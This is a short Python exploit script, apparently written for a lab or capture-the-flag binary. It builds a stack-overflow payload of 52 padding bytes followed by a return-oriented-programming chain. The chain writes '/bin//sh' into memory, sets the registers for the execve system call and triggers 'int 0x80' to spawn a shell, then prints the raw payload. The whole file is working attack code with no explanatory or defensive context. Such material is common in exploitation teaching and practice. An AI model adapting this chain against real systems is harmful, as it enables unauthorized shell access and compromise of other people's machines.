#!/usr/bin/env python3

from struct import pack
import sys

# Padding goes here
p = b''
p += b'A'*(16+36)
p += pack('<I', 0x0807887b) # pop edx ; ret
p += pack('<I', 0x080f7060) # @ .data
p += pack('<I', 0x080c2326) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x0805a58b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807887b) # pop edx ; ret
p += pack('<I', 0x080f7064) # @ .data + 4
p += pack('<I', 0x080c2326) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x0805a58b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0807887b) # pop edx ; ret
p += pack('<I', 0x080f7068) # @ .data + 8
p += pack('<I', 0x0804eb43) # xor eax, eax ; ret
p += pack('<I', 0x0805a58b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080f7060) # @ .data
p += pack('<I', 0x080eb5f1) # pop ecx ; ret
p += pack('<I', 0x080f7068) # @ .data + 8
p += pack('<I', 0x0807887b) # pop edx ; ret
p += pack('<I', 0x080f7068) # @ .data + 8
p += pack('<I', 0x0804eb43) # xor eax, eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08084336) # inc eax ; ret
p += pack('<I', 0x08076485) # int 0x80
sys.stdout.buffer.write(p)
